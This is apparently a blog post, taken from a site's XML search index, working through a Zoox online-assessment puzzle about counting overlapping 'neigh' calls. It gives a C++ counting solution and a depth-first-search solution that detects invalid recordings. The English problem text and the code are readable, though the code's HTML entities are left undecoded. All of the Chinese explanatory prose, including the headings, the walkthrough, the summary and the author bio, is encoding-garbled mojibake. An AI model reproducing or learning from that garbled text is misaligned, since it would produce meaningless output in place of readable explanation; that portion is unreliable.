é¡Œç›®äºŒ - é¦¬å«è²çš„éŒ„éŸ³é¡Œç›®æ•˜è¿°There are a lot of horses in the yard,and we want to count how many there are.Unfortunately, we&#x27;ve only got a recording of the sounds from the yard.All the horses say &quot;neigh&quot;.The problem is they can &quot;neigh&quot; many times.The recording from the yard is sadly all mixed together.So, we need to figure out from the overlapping sounds how many horses there could be.For example, we&#x27;ve got two horses in the yard, and we hear this &quot;neigneighh&quot;.From this recording, we can successfully deduce there are 2 horses.Another example is &quot;neighneigh&quot;.From this example, we can only tell there is one horse in the yard.As an additional complexity, our recording might not be perfect.If it&#x27;s a bad recording, we should give &quot;Invalid&quot; as the response.The input will be given as a string on one line.The output should be printed on it&#x27;s own line.Sample InputnenigehnieighghSample Output2

é¡Œæ„ç†è§£èˆ‡é€£çµé€™é¡Œä¸»è¦å°±æ˜¯è¦çœ‹ç›®å‰éŒ„åˆ°çš„å­—ä¸²ä¸­ï¼Œåˆ°åº•å¯èƒ½åŒæ™‚æœ‰å¹¾åŒ¹é¦¬åœ¨å«ã€‚è€Œæˆ‘å€‘è¦çŸ¥é“åŒæ™‚æœ‰å¹¾åŒ¹é¦¬åœ¨å«ï¼Œå°±çœ‹åˆ°åº•æœ‰å¹¾å€‹ â€œneighâ€ åŒæ™‚åœ¨é€²è¡Œï¼Œæ¯”å¦‚ä¸‹ä¾‹å°±æ˜¯æœ‰ 5 åŒ¹é¦¬åŒæ™‚åœ¨å«ï¼š
â€œnnnnneeeeeiiiiiggggghhhhhâ€ã€‚
è§£æ³•ä¸€ - ç°¡å–®æš´åŠ›æ³•çœ‹å®Œä¸Šé¢çš„é¡Œç›®æ•˜è¿°ï¼Œæœ€ç›´è¦ºçš„æƒ³æ³•æ‡‰è©²æ˜¯å¯ä»¥çœ‹ç¾åœ¨æœ‰å¹¾å€‹ nï¼ŒçŸ¥é“å·²ç¶“æœ‰å¹¾åŒ¹é¦¬å«äº†ï¼Œç„¶å¾Œçœ‹åˆ° hï¼Œå°±çŸ¥é“æœ‰ä¸€åŒ¹é¦¬å«å®Œäº†ï¼Œè€Œæˆ‘å€‘åªè¦è¨ˆç®—æ•´å€‹ record ä¸­æœ€å¤šåŒæ™‚æœ‰å¹¾å€‹é‚„æ²’è¢« h çµæŸçš„ nï¼Œå°±çŸ¥é“æœ€å¤šåŒæ™‚æœ‰å¹¾åŒ¹é¦¬åœ¨å«äº†ã€‚
é€™å€‹æƒ³æ³•è¦å¯¦ä½œä¹Ÿå¾ˆç°¡å–®ï¼Œç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š
#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int parse_record(string s) &#123;  int max = 0, cur = 0;  for(int i = 0; i &lt; s.length(); i++) &#123;    char c = s[i];    if (c == &#x27;n&#x27;) &#123; cur++; &#125;    if (c == &#x27;h&#x27;) &#123; cur--; &#125;    if (cur &gt; max) &#123; max = cur; &#125;  &#125;    return max;&#125;int main() &#123;  string s = &quot;nenigehnieighgh&quot;;    int horses = parse_record(s);    cout &lt;&lt; &quot;There are at least &quot; &lt;&lt; horses &lt;&lt; &quot; horses in the yard.\n&quot;;  return 0;&#125;

ä¸éé¡Œç›®å¦‚æœé€™éº¼ç°¡å–®ï¼Œé‚£å°±å¤ªå¥½äº†XD
å¤§å®¶å¦‚æœè¨˜å¾—é¡Œç›®ï¼Œè£¡é¢æœ‰èªª
As an additional complexity, our recording might not be perfect.If it&#x27;s a bad recording, we should give &quot;Invalid&quot; as the response.

ä½†æˆ‘å€‘çš„è§£æ³•å¾ˆæ˜é¡¯ä¸å¯èƒ½ç”¢ç”Ÿ invalidï¼Œå› ç‚ºæˆ‘å€‘å‡è¨­äº†æ¯ä¸€å€‹ n ä¸€å®šéƒ½æœƒæœ‰ ä¸€å€‹ h çµå°¾ã€‚æ–¼æ˜¯æˆ‘å€‘è¦ä¾†æ¢è¨è§£ç­”äºŒã€‚
è§£æ³•äºŒ - Depth First Searchæ—¢ç„¶å‰›å‰›çš„è§£æ³•ä¸€ä¸é©ç”¨æ–¼ä¸ valid çš„æƒ…æ³ï¼Œé‚£æˆ‘å€‘å°±è¦ä¾†æƒ³æƒ³æœ‰å“ªäº›æ˜¯éœ€è¦è€ƒæ…®çš„ invalid caseï¼š

neigh é€™ 5 å€‹ char åœ¨æ•´å€‹å­—ä¸²ä¸­å‡ºç¾çš„æ¬¡æ•¸ä¸ä¸€è‡´ (å¦‚æœåªæœ‰é€™ç¨® invalid caseï¼Œé‚£å¯ä»¥å…ˆèµ°éä¸€æ¬¡å­—ä¸²ç¢ºèªå‡ºç¾æ¬¡æ•¸éƒ½ä¸€æ¨£ï¼Œå†ç”¨è§£æ³•ä¸€)
neigh é€™ 5 å€‹ char åœ¨æ•´å€‹å­—ä¸²ä¸­å‡ºç¾çš„æ¬¡æ•¸æ­£ç¢ºï¼Œä½†é †åºä¸å° (ä¾‹å¦‚å¯èƒ½å‡ºç¾ eighnï¼Œé›–ç„¶æ¯å€‹ char å‡ºç¾çš„æ¬¡æ•¸éƒ½å°ï¼Œä½†å…§å®¹éŒ¯äº†)

å› ç‚ºæœ‰é€™å…©ç¨® invalid caseï¼Œæ‰€ä»¥æˆ‘å€‘ä¸èƒ½åªæ˜¯å»ç®—æ¬¡æ•¸ï¼Œè€Œæ˜¯å¾—å»è¿½è¹¤åˆ°åº•æ¯ä¸€å€‹å­—æ¯å°æ‡‰åˆ°å“ªåŒ¹é¦¬ï¼Œå¾è€Œç¢ºèªåˆ°åº•æ˜¯ä¸æ˜¯ validï¼Œä¸¦ä¸”åœ¨éç¨‹ä¸­æŒçºŒè¨˜éŒ„ç›®å‰åŒæ™‚æœ‰å¹¾åŒ¹é¦¬åœ¨å«ã€‚
åœ¨ä¸‹é¢çš„å¯¦ä½œç•¶ä¸­ï¼Œæˆ‘å€‘ç”¨ expect ä¾†è¨˜éŒ„ç›®å‰æœ‰åœ¨è¿½è¹¤çš„é¦¬å«åˆ°å“ªä¸€å€‹å­—æ¯ï¼Œç„¶å¾Œåœ¨é‡åˆ°éŒ„éŸ³è£¡é¢æ–°çš„å­—æ¯æ™‚ï¼Œæˆ‘å€‘å°±å¯ä»¥æ ¹æ“š expect è£¡é¢è¨˜éŒ„çš„å­—æ¯ä¾†åˆ¤æ–·æ–°çš„å­—æ¯å¯ä»¥æ˜¯åˆ†é…çµ¦å“ªä¸€åŒ¹é¦¬ã€‚
å¯¦ä½œå¦‚ä¸‹ï¼š
#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;char next(char c) &#123;  char n;    switch(c) &#123;    case &#x27;n&#x27; :      n = &#x27;e&#x27;;      break;    case &#x27;e&#x27; :      n = &#x27;i&#x27;;      break;    case &#x27;i&#x27; :      n = &#x27;g&#x27;;      break;    case &#x27;g&#x27; :      n = &#x27;h&#x27;;      break;    case &#x27;h&#x27; :      n = &#x27;#&#x27;;      break;  &#125;  return n;&#125;void helper(string s, int pos, string expect, int local_max, int &amp;max_horses) &#123;  if (pos == s.length() &amp;&amp; expect.length() == 0 &amp;&amp; local_max &gt; max_horses) &#123;    max_horses = local_max;    return;  &#125;  if (pos &gt;= s.length()) &#123;    return;  &#125;    char c = s[pos];  if(c == &#x27;n&#x27;) &#123;    string new_expect = expect + c;    int new_local_max = local_max;    if(new_expect.length() &gt; local_max) &#123;      new_local_max = new_expect.length();    &#125;    helper(s, pos+1, new_expect, new_local_max, max_horses);  &#125;  else &#123;    for(int i=0; i&lt;expect.length(); i++) &#123;      char val = expect[i];      if (c == next(val)) &#123;        if(c == &#x27;h&#x27;) &#123;          string new_expect = &quot;&quot;;          for(int j=0; j&lt;expect.length(); j++) &#123;            if(j == i) continue;            new_expect += expect[j];          &#125;          helper(s, pos+1, new_expect, local_max, max_horses);        &#125; else &#123;          expect[i] = next(val);          helper(s, pos+1, expect, local_max, max_horses);          expect[i] = val;        &#125;      &#125;    &#125;  &#125;&#125;int main() &#123;  string s = &quot;neigneighh&quot;;  int max_horses = 0;  helper(s, 0, &quot;&quot;, 0, max_horses);  if(max_horses == 0) cout &lt;&lt; &quot;Invalid record.\n&quot;;  else cout &lt;&lt; &quot;There are at least &quot; &lt;&lt; max_horses &lt;&lt; &quot; horses in the yard.\n&quot;;  return 0;&#125;

ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ä»‹ç´¹äº† ZOOX å–œæ­¡å‡ºçš„ OA é¡Œç›®è·Ÿè§£ç­”ï¼Œé›–ç„¶åˆ†äº«äº†é€™ç¯‡æ–‡ç« ï¼Œä½†æˆ‘æƒ³å‚³é”çš„æ¦‚å¿µä¸¦ä¸æ˜¯ â€œé¢è©¦å‰ï¼Œè¦æŠŠé€™å…¬å¸æ‰€æœ‰è€ƒå¤é¡Œéƒ½ç·´ç¿’éâ€ï¼Œè€Œåªæ˜¯å–®ç´”åœ°å¥½å¥‡ ZOOX æœƒå‡ºä»€éº¼æ¨£çš„é¡Œç›®ï¼Œé€™äº›é¡Œç›®æ€éº¼ç”¨åŸºç¤çš„æ¼”ç®—æ³• &amp; è³‡æ–™çµæ§‹èƒ½åŠ›ä¾†è™•ç†ã€‚
é—œæ–¼æº–å‚™é¢è©¦çš„ mindsetï¼Œæˆ‘æ¨è–¦å¯ä»¥çœ‹çœ‹ æˆ‘æ˜¯å¦‚ä½•æ‹¿åˆ°çŸ½è°·é ‚ç´šç§‘æŠ€å…¬å¸çš„10 å€‹ offer çš„ï¼Œè£¡é¢è¬›åˆ°æŠŠ Leetcode å‰ 150 é¡Œèæœƒè²«é€šå°±èƒ½æ‡‰ä»˜ç„¡çª®é¡Œç›®è®ŠåŒ–çš„è§€å¿µï¼Œéå¸¸å€¼å¾—é«”æœƒè·Ÿå¯¦ä½œã€‚
å»¶ä¼¸é–±è®€
[é¢è©¦ç¶“é©—] è‡ªå‹•é§•é§›å…¬å¸ Aurora Onsite
[é¢è©¦ç¶“é©—] DeepScale è‡ªå‹•é§•é§›å…¬å¸ OA 
Top Self Driving Car Startups
Zoox Can Cruise San Francisco Without Drivers. Now It Needs Money

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>ZOOX, Online Assessment, Interview</tag>
      </tags>
  </entry>
</search>
